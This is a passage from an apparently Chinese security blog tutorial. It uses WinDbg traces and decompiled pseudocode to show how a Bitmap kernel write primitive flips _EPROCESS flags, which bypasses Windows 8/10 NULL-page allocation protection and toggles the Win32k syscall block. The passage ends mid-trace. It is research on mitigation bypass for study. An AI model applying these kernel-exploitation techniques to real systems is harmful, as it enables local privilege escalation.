ffffe28d`12cb23d8&nbsp;&nbsp;ffffa709`c88158ad</pre><p style="text-align: center; text-indent: 0em;"><img src="http://p7.qhimg.com/t01eb9345f255ef4987.png" title="t0144791914c38b1dc5.png" alt="http://p3.qhimg.com/t0144791914c38b1dc5.png"/></p><p style="text-align: left; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;&nbsp;&nbsp; 我和大家分享了pvScan0在Bitmap这种data attack中的核心地位，Bitmap的pkernelAddress的获取方法和如何通过pvScan0完成攻击，接下来，我将结合偶像MJ0011的PPT，来讲一下Win10的一些坑，以及回归Win8下来看一下MJ0011的PPT中介绍的一些防护机制，和Bitmap的威力。</span></p><p style="text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">被Win10吊打的日子</span></strong></span></p><hr/><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">在MJ0011的PPT中介绍了几种防护机制，比如禁零页，禁Win32k调用，SMEP，ExPoolWithTagNX等等。本来刚开始想在Win10下进行实验，但是发现Win10下有很多奇怪的坑。这里简单提一下几种防护机制：</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">1、禁零页，NtAllocateVirtualMmemory是现在常用的内核漏洞利用手法，Win8 _EPROCESS增加了一比特的Flags.VdmAllowed，当为0时禁用，当为1时可用。</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">2、禁Win32k，Win32k存在很多漏洞，比如UAF，我在前面两个经典内核漏洞调试的分享中都是Win32k出的问题，这里通过_EPROCESS结构增加一比特的Flags2.DisallowWin32kSystemCalls禁用调用。</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">3、SMEP，在内核漏洞利用中，通常是利用内核态的一些失误执行用户态申请的空间存放的shellcode，这里直接通过SMEP禁止在内核态执行用户态空间的代码。</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">这里，我将以禁Win32k调用和禁零页来做实验，利用的就是Bitmap来修改这两个比特的值，看看能不能绕过禁用机制，首先来看一下当前进程，以及对应的两个值。</span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;!process
PROCESS&nbsp;ffffe28d12cb2080
&nbsp;&nbsp;&nbsp;&nbsp;SessionId:&nbsp;1&nbsp;&nbsp;Cid:&nbsp;0b48&nbsp;&nbsp;&nbsp;&nbsp;Peb:&nbsp;0117d000&nbsp;&nbsp;ParentCid:&nbsp;1124
&nbsp;&nbsp;&nbsp;&nbsp;DirBase:&nbsp;320b6000&nbsp;&nbsp;ObjectTable:&nbsp;ffffa709d5f84500&nbsp;&nbsp;HandleCount:&nbsp;&lt;Data&nbsp;Not&nbsp;Accessible&gt;
&nbsp;&nbsp;&nbsp;&nbsp;Image:&nbsp;Stop_by_win10.exe
kd&gt;&nbsp;dt&nbsp;nt!_EPROCESS&nbsp;VdmAllowed&nbsp;ffffe28d12cb2080
&nbsp;&nbsp;&nbsp;+0x304&nbsp;VdmAllowed&nbsp;:&nbsp;0y0//标志位为0，禁用零页
kd&gt;&nbsp;dt&nbsp;nt!_EPROCESS&nbsp;DisallowWin32kSystemCalls&nbsp;ffffe28d12cb2080
&nbsp;&nbsp;&nbsp;+0x300&nbsp;DisallowWin32kSystemCalls&nbsp;:&nbsp;0y0//标志位为1，默认不禁用Win32k
kd&gt;&nbsp;dd&nbsp;ffffe28d12cb2080+300&nbsp;L4&nbsp;//查看一下Flags2和Flags的值
ffffe28d`12cb2380&nbsp;&nbsp;0000d000&nbsp;144d0c01&nbsp;a1beb1e1&nbsp;01d288e0</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">可以看到，在当前进程Win32k API是不禁用的，也就是说，我们仍然可以直接调用Win32k的API，而NtAllocateVirtualMemory则处于禁用状态。对于Flags来说是0000d0000，Flags2来说是144d0c01，这样把它们转换成二进制，把对应比特位置换为1（这个内容可以在我的源码中看到），然后赋值给各自的Flags。</span><br/></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;r&nbsp;r13//获取两个Flags值，并且修改比特位之后的值
r13=a1beb1e1164d0c00
kd&gt;&nbsp;r&nbsp;r14
r14=144d0c018000d000
kd&gt;&nbsp;g//命中软中断
Break&nbsp;instruction&nbsp;exception&nbsp;-&nbsp;code&nbsp;80000003&nbsp;(first&nbsp;chance)
0033:00007ff7`9dd222b0&nbsp;cc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3
kd&gt;&nbsp;g
Break&nbsp;instruction&nbsp;exception&nbsp;-&nbsp;code&nbsp;80000003&nbsp;(first&nbsp;chance)
0033:00007ff7`9dd222b0&nbsp;cc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3
kd&gt;&nbsp;dd&nbsp;ffffe28d12cb2080+300&nbsp;L4//修改后，通过SetBitmap写入偏移
ffffe28d`12cb2380&nbsp;&nbsp;8000d000&nbsp;164d0c01&nbsp;a1beb1e1&nbsp;01d288e0</pre><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这里我采用了Win7零页分配的方法，handle选择0xffffffffffffffff，但是发现在Win10中，会调用ObpReferenceObjectByHandleWithTag函数Check handle，如果不是一个有效的handle，则直接返回，NTSTATUS直接报错。</span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;p
nt!MiAllocateVirtualMemory+0x7b8:
fffff801`7cee27c8&nbsp;498bca&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rcx,r10
kd&gt;&nbsp;p&nbsp;//ObpReferenceObjectByHandleWithTag&nbsp;check&nbsp;handle
nt!MiAllocateVirtualMemory+0x7bb:
fffff801`7cee27cb&nbsp;e8a0070100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;nt!ObpReferenceObjectByHandleWithTag&nbsp;(fffff801`7cef2f70)
kd&gt;&nbsp;p
nt!MiAllocateVirtualMemory+0x7c0:
fffff801`7cee27d0&nbsp;89442464&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[rsp+64h],eax
kd&gt;&nbsp;r&nbsp;eax//没有这个handle则返回NTSTATUS
eax=c0000008
//&nbsp;ObpReferenceObjectByHandleWithTag&nbsp;检查逻辑
&nbsp;&nbsp;if&nbsp;(&nbsp;(BugCheckParameter1&nbsp;&amp;&nbsp;0x80000000)&nbsp;!=&nbsp;0i64&nbsp;)
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;BugCheckParameter1&nbsp;==&nbsp;-1i64&nbsp;)//如果handle值为0xfff....ff
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v9&nbsp;!=&nbsp;PsProcessType&nbsp;&amp;&amp;&nbsp;v9&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LODWORD(v12)&nbsp;=&nbsp;-1073741788;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v37&nbsp;=&nbsp;*(_QWORD&nbsp;*)(v8&nbsp;+&nbsp;184);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v11&nbsp;&amp;&nbsp;0xFFE00000&nbsp;&amp;&amp;&nbsp;a4&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LODWORD(v12)&nbsp;=&nbsp;-1073741790;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;……
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;(unsigned&nbsp;int)v12;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;C0000008
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;BugCheckParameter1&nbsp;==&nbsp;-2i64&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;}</pre><p style="text-align: left; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;&nbsp;&nbsp; 这样，我们就只能修改代码通过OpenProcess获得当前进程handle，并且将VdmAllowed置1，但是发现即使NTSTATUS返回0，也就是STATUS_SUCCESS，</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">内存状态可写，只需要memset初始化内存即可。</span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;!process
PROCESS&nbsp;ffffe28d12fb0080
&nbsp;&nbsp;&nbsp;&nbsp;SessionId:&nbsp;1&nbsp;&nbsp;Cid:&nbsp;10b0&nbsp;&nbsp;&nbsp;&nbsp;Peb:&nbsp;00ddb000&nbsp;&nbsp;ParentCid:&nbsp;1124
&nbsp;&nbsp;&nbsp;&nbsp;DirBase:&nbsp;51685000&nbsp;&nbsp;ObjectTable:&nbsp;ffffa709d9138200&nbsp;&nbsp;HandleCount:&nbsp;&lt;Data&nbsp;Not&nbsp;Accessible&gt;
&nbsp;&nbsp;&nbsp;&nbsp;Image:&nbsp;Stop_by_win10.exe
kd&gt;&nbsp;dt&nbsp;nt!_EPROCESS&nbsp;VdmAllowed&nbsp;ffffe28d12fb0080&nbsp;//当前VdmAllowed为1
&nbsp;&nbsp;&nbsp;+0x304&nbsp;VdmAllowed&nbsp;:&nbsp;0y1
kd&gt;&nbsp;p
0033:00007ff7`16e7204c&nbsp;ff55a0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;qword&nbsp;ptr&nbsp;[rbp-60h]
kd&gt;&nbsp;p
0033:00007ff7`16e7204f&nbsp;0f28b424e0040000&nbsp;movaps&nbsp;&nbsp;xmm6,xmmword&nbsp;ptr&nbsp;[rsp+4E0h]
kd&gt;&nbsp;p
0033:00007ff7`16e72057&nbsp;85c0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test&nbsp;&nbsp;&nbsp;&nbsp;eax,eax
kd&gt;&nbsp;r&nbsp;eax//NTSTATUS返回0，也就是STATUS_SUCCESS
eax=0
kd&gt;&nbsp;dd&nbsp;4600000000//等待初始化的内存
00000046`00000000&nbsp;&nbsp;????????&nbsp;????????&nbsp;????????&nbsp;????????
00000046`00000010&nbsp;&nbsp;????????&nbsp;????????&nbsp;????????&nbsp;????????</pre><p style="text-align: left; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;&nbsp;&nbsp; 同样，我们修改Win32k为1，这样就禁用了win32k调用，可以发现，在禁用后，会阻止win32k的调用，从而无法初始化cmd。关于win32k调用的逻辑后面会讲到。</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p5.qhimg.com/t01c63c9af58639cf8c.png" title="t01ced5dfa6174aad9b.png" alt="http://p7.qhimg.com/t01ced5dfa6174aad9b.png"/></p><p style="text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;</span></p><p style="text-align: left; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">回归Win8看防护之NtAllocateVirtualMemory</span></strong></p><hr/><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">接下来我们回到Win8 x86，来看一下NtAllocateVirtualMemory的防护到底是怎样的。这里请使用文末我修改后的适用于win8 x86的代码。首先是禁用零页申请内存。我们首先在禁用零页时调试，首先进入内核态，从ntdll进入nt。</span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;p
001b:77d4f04d&nbsp;e803000000&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;77d4f055//调用NtAllocateVirtualMemory
kd&gt;&nbsp;t
001b:77d4f055&nbsp;8bd4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,esp
001b:77d4f055&nbsp;8bd4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,esp
001b:77d4f057&nbsp;0f34&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sysenter//x86下用sysenter进入内核态
001b:77d4f059&nbsp;c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">在nt!NtAllocateVirtualMemory下断点跟踪，在入口处会先将Handle、BaseAddress等内容传入寄存器（用于各种检查，比如对Handle检查合法性，在之前已经提过），接下来会通过fs:[0x124]获取到_KTHRAD结构</span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;p
nt!NtAllocateVirtualMemory+0x34://获取KTHREAD结构
81a891a2&nbsp;648b3d24010000&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edi,dword&nbsp;ptr&nbsp;fs:[124h]
kd&gt;&nbsp;p
nt!NtAllocateVirtualMemory+0x3b:
81a891a9&nbsp;897da8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[ebp-58h],edi
kd&gt;&nbsp;r&nbsp;edi
edi=86599bc0
kd&gt;&nbsp;dt&nbsp;nt!_KTHREAD&nbsp;86599bc0
&nbsp;&nbsp;&nbsp;+0x000&nbsp;Header&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;_DISPATCHER_HEADER
&nbsp;&nbsp;&nbsp;+0x010&nbsp;SListFaultAddress&nbsp;:&nbsp;(null)</pre><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">之后会将_KTHREAD+0x80偏移的值交给eax寄存器，偏移加0x80实际上就是EPROCESS结构，这个位置属于APC域，这个位置在KTHREAD+0x70的位置，而EPROCESS又保存在KAPC_STATE+0x10的位置</span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;p//edi是KTHREAD，eax的值是EPROCESS
nt!NtAllocateVirtualMemory+0x3e:
81a891ac&nbsp;8b8780000000&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[edi+80h]
kd&gt;&nbsp;p
nt!NtAllocateVirtualMemory+0x44:
81a891b2&nbsp;8945b0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[ebp-50h],eax
kd&gt;&nbsp;r&nbsp;eax
eax=85a44040
kd&gt;&nbsp;!process
PROCESS&nbsp;85a44040&nbsp;&nbsp;SessionId:&nbsp;1&nbsp;&nbsp;Cid:&nbsp;0860&nbsp;&nbsp;&nbsp;&nbsp;Peb:&nbsp;7f74d000&nbsp;&nbsp;ParentCid:&nbsp;0f08
&nbsp;&nbsp;&nbsp;&nbsp;DirBase:&nbsp;3df14300&nbsp;&nbsp;ObjectTable:&nbsp;8c173740&nbsp;&nbsp;HandleCount:&nbsp;&lt;Data&nbsp;Not&nbsp;Accessible&gt;
&nbsp;&nbsp;&nbsp;&nbsp;Image:&nbsp;Stop_by_win10.exe
kd&gt;&nbsp;dt&nbsp;nt!_KTHREAD&nbsp;ApcState//偏移加0x70
&nbsp;&nbsp;&nbsp;+0x070&nbsp;ApcState&nbsp;:&nbsp;_KAPC_STATE
kd&gt;&nbsp;dt&nbsp;nt!_KAPC_STATE//偏移加0x10，一共是0x80，对应的位置是EPROCESS
&nbsp;&nbsp;&nbsp;+0x000&nbsp;ApcListHead&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;[2]&nbsp;_LIST_ENTRY
&nbsp;&nbsp;&nbsp;+0x010&nbsp;Process&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Ptr32&nbsp;_KPROCESS</pre><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">接下来我们单步跟踪，到达一处判断，这里会将BaseAddress和0x10000作比较，小于则跳转到另一处判断</span><br/></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;p
nt!NtAllocateVirtualMemory+0x9b7:
81a89b25&nbsp;3bd0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,eax
kd&gt;&nbsp;r&nbsp;edx
edx=00000060
kd&gt;&nbsp;r&nbsp;eax
eax=00010000
kd&gt;&nbsp;p
nt!NtAllocateVirtualMemory+0x9b9://如果申请地址值小于0x1000，则跳转
81a89b27&nbsp;0f8257781200&nbsp;&nbsp;&nbsp;&nbsp;jb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nt!&nbsp;??&nbsp;::NNGAKEGL::`string&#39;+0x19d1a&nbsp;(81bb1384)
kd&gt;&nbsp;p
nt!&nbsp;??&nbsp;::NNGAKEGL::`string&#39;+0x19d1a:
81bb1384&nbsp;f787c400000000000001&nbsp;test&nbsp;dword&nbsp;ptr&nbsp;[edi+0C4h],1000000h
kd&gt;&nbsp;dd&nbsp;edi+c4&nbsp;L1//edi+0C4就是Flags
85a44104&nbsp;&nbsp;144d0c01
kd&gt;&nbsp;p
nt!&nbsp;??&nbsp;::NNGAKEGL::`string&#39;+0x19d24://这里会将VdmAllowed值作比较判断
81bb138e&nbsp;0f859987edff&nbsp;&nbsp;&nbsp;&nbsp;jne&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nt!NtAllocateVirtualMemory+0x9bf&nbsp;(81a89b2d)</pre><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">这个值很有意思，就是_EPROCESS.Flags2的值，来看一下，而这里判断的就是Flags2中的一个比特位VdmAllowed</span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;dt&nbsp;nt!_EPROCESS&nbsp;Flags&nbsp;85a44040
&nbsp;&nbsp;&nbsp;+0x0c4&nbsp;Flags&nbsp;:&nbsp;0x144d0c01
kd&gt;&nbsp;dt&nbsp;nt!_EPROCESS&nbsp;VdmAllowed&nbsp;85a44040
&nbsp;&nbsp;&nbsp;+0x0c4&nbsp;VdmAllowed&nbsp;:&nbsp;0y0</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">这里值为0，也就是禁用零页分配，因此这里分配不成功将会进入处理，返回C00000F0</span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;p
nt!&nbsp;??&nbsp;::NNGAKEGL::`string&#39;+0x19d2a:
81bb1394&nbsp;bef00000c0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esi,0C00000F0h
kd&gt;&nbsp;p
nt!&nbsp;??&nbsp;::NNGAKEGL::`string&#39;+0x19d2f:
81bb1399&nbsp;e94c87edff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nt!NtAllocateVirtualMemory+0x97c&nbsp;(81a89aea)</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">我们来看一下NtAllocateVirtualMemory相关逻辑的伪代码。</span></p><pre class="brush:bash;toolbar:false">NTSTATUS&nbsp;__stdcall&nbsp;NtAllocateVirtualMemory(HANDLE&nbsp;ProcessHandle,&nbsp;PVOID&nbsp;*BaseAddress,&nbsp;ULONG&nbsp;ZeroBits,&nbsp;PULONG&nbsp;AllocationSize,&nbsp;ULONG&nbsp;AllocationType,&nbsp;ULONG&nbsp;Protect)
{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v65&nbsp;=&nbsp;ProcessHandle;
&nbsp;&nbsp;&nbsp;&nbsp;v68&nbsp;=&nbsp;BaseAddress;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v67&nbsp;=&nbsp;AllocationSize;
&nbsp;&nbsp;&nbsp;&nbsp;v7&nbsp;=&nbsp;__readfsdword(292);//获取_KTHREAD结构
&nbsp;&nbsp;&nbsp;&nbsp;v76&nbsp;=&nbsp;v7;
&nbsp;&nbsp;&nbsp;&nbsp;v78&nbsp;=&nbsp;*(PVOID&nbsp;*)(v7&nbsp;+&nbsp;128);&nbsp;//获取+0x80&nbsp;EPROCESS结构
&nbsp;&nbsp;&nbsp;&nbsp;……
&nbsp;&nbsp;&nbsp;&nbsp;PreviousMode[0]&nbsp;=&nbsp;*(_BYTE&nbsp;*)(v7&nbsp;+&nbsp;346);
&nbsp;&nbsp;&nbsp;&nbsp;ms_exc.registration.TryLevel&nbsp;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;v9&nbsp;=&nbsp;v68;//传递地址值
&nbsp;&nbsp;&nbsp;&nbsp;……
&nbsp;&nbsp;&nbsp;&nbsp;v12&nbsp;=&nbsp;(unsigned&nbsp;int)*v9;&nbsp;//BaseAddress连续传递
&nbsp;&nbsp;&nbsp;&nbsp;v74&nbsp;=&nbsp;v12;//再次传递
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v74&nbsp;&lt;&nbsp;0x10000&nbsp;&amp;&amp;&nbsp;!(*(_DWORD&nbsp;*)(v14&nbsp;+&nbsp;196)&nbsp;&amp;&nbsp;0x1000000)&nbsp;)//&nbsp;判断v74&nbsp;BaseAddress是否小于10000，如果小于会认为是零页内存分配，则会判断v14+196，也就是Flags.VdmAllowed是否允许分配
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v25&nbsp;=&nbsp;0xC00000F0;//如果是零页分配且禁用零页分配，则返回C00000F0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;LABEL_145;
&nbsp;&nbsp;&nbsp;&nbsp;}
}</pre><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">我们尝试使用Bitmap来修改VdmAllowed看看能不能进行零页分配，继续执行到达我们setbitmap的地方。</span><br/></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;g
Break&nbsp;instruction&nbsp;exception&nbsp;-&nbsp;code&nbsp;80000003&nbsp;(first&nbsp;chance)
001b:00021d21&nbsp;cc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3
kd&gt;&nbsp;dt&nbsp;nt!_EPROCESS&nbsp;VdmAllowed&nbsp;85a44040
&nbsp;&nbsp;&nbsp;+0x0c4&nbsp;VdmAllowed&nbsp;:&nbsp;0y1</pre><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">可以看到VdmAllowed被改掉了，进入刚才的判断</span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;g
Breakpoint&nbsp;1&nbsp;hit
nt!NtAllocateVirtualMemory+0x9b7://判断edx小于1000
81a89b25&nbsp;3bd0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,eax
kd&gt;&nbsp;r&nbsp;edx
edx=00000060
kd&gt;&nbsp;p
nt!NtAllocateVirtualMemory+0x9b9:
81a89b27&nbsp;0f8257781200&nbsp;&nbsp;&nbsp;&nbsp;jb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nt!&nbsp;??&nbsp;::NNGAKEGL::`string&#39;+0x19d1a&nbsp;(81bb1384)
kd&gt;&nbsp;p//判断VdmAllowed为1，允许零页申请
nt!&nbsp;??&nbsp;::NNGAKEGL::`string&#39;+0x19d1a:
81bb1384&nbsp;f787c400000000000001&nbsp;test&nbsp;dword&nbsp;ptr&nbsp;[edi+0C4h],1000000h
kd&gt;&nbsp;p
nt!&nbsp;??&nbsp;::NNGAKEGL::`string&#39;+0x19d24:
81bb138e&nbsp;0f859987edff&nbsp;&nbsp;&nbsp;&nbsp;jne&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nt!NtAllocateVirtualMemory+0x9bf&nbsp;(81a89b2d)
kd&gt;&nbsp;p
nt!NtAllocateVirtualMemory+0x9bf://跳转到正常流程，而不返回C0000F0
81a89b2d&nbsp;8bc6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,esi</pre><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到，绕过了刚才的判断，接下来直接执行，可以看到，NtAllocateVirtualMemory返回了STATUS_SUCCESS（图）</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p7.qhimg.com/t01d1a35e79c9c27dd9.png" title="t01b89afbe9d2ba5930.png" alt="http://p1.qhimg.com/t01b89afbe9d2ba5930.png"/></p><p style="text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;</span></p><p style="text-align: left; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">回归Win8看防护之Win32k.sys</span></strong></p><hr/><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">下面我们来看一下Win32k的API禁用的情况，当然这里默认Disallow的比特位也是为0，也就是在当前进程不禁用Win32k系统调用，在PsConvertToGuiThread函数中。</span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;p
nt!PsConvertToGuiThread+0x9://获得KTHREAD结构
81b0c67f&nbsp;648b3524010000&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esi,dword&nbsp;ptr&nbsp;fs:[124h]
kd&gt;&nbsp;r&nbsp;esi
esi=8548b040
kd&gt;&nbsp;dt&nbsp;nt!_KTHREAD&nbsp;8548b040
